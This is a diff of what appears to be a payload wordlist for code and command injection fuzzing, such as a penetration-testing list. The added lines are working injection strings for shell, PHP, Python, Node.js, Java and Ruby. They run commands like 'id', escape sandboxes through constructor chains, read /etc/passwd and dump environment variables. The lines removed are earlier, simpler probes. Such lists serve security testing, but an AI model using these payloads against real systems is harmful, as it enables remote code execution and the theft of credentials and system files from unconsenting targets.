@@ -1,13 +1,75 @@
-1+1
-7*7
-1; process.exit()
-1; require('child_process').execSync('id')
-__import__('os').system('id')
-__import__('subprocess').getoutput('id')
-exec('import os; os.system("id")')
-require('child_process').execSync('id')
-Process.run('id')
-system('id')
+; id
+';id;'
+"; id; "
 `id`
 $(id)
-Runtime.getRuntime().exec("id")
+|id
+& id
+;system("id")
+;exec("id")
+;passthru("id")
+;shell_exec("id")
+;popen("id","r")
+;proc_open("id",[],$p)
+;`id`
+;${system("id")}
+${system("id")}
+{system("id")}
+;phpinfo()
+;phpinfo(1)
+-1;system("id")//
+-1;exec("id")//
+-1;passthru("id")//
+-1;shell_exec("id")//
+-1";system("id")//
+-1';system("id")//
+-1;system('id')//
+-1;system(chr(105).chr(100))//
+1;import os;os.system("id")
+1;import os;print(os.popen("id").read())
+1;exec("import os;os.system('id')")
+1;__import__('os').system('id')
+1;getattr(__import__('os'),'system')('id')
+1+__import__('os').system('id')
+1 and __import__('os').system('id')
+1 or __import__('os').system('id')
+__import__('os').system('id')
+os.system('id')
+os.popen('id').read()
+subprocess.check_output(['id'])
+subprocess.Popen(['id'],stdout=-1).communicate()
+eval("__import__('os').system('id')")
+exec("import os;os.system('id')")
+compile("import os;os.system('id')","<string>","exec")
+;require("child_process").exec("id")
+;process.mainModule.require("child_process").exec("id")
+;child_process.exec("id")
+;require("fs").readFileSync("/etc/passwd")
+;global.process.mainModule.constructor._resolveFilename("child_process")
+;(function(){return require("child_process").exec("id")})()
+;eval(require("fs").readFileSync("/etc/passwd","utf8"))
+;(new Function("return require('child_process').execSync('id').toString()"))()
+require("child_process").execSync("id")
+process.env
+Object.keys(process.env).join(",")
+global.process.argv
+this.constructor.constructor('return process')()
+this.constructor.constructor('return require')()("child_process").exec("id")
+;Runtime.getRuntime().exec("id")
+;Process.start("id")
+;System.getenv()
+;System.getProperties()
+;(new java.lang.ProcessBuilder("id")).start()
+;$x=new java.lang.ProcessBuilder("id");$x.start()
+;`id`
+;#{system("id")}
+;%x(id)
+;%x{id}
+;%x[id]
+;system("id")
+;exec("id")
+;IO.read("/etc/passwd")
+;File.read("/etc/passwd")
+;`cat /etc/passwd`
+;Kernel.system("id")
+;Kernel.exec("id")
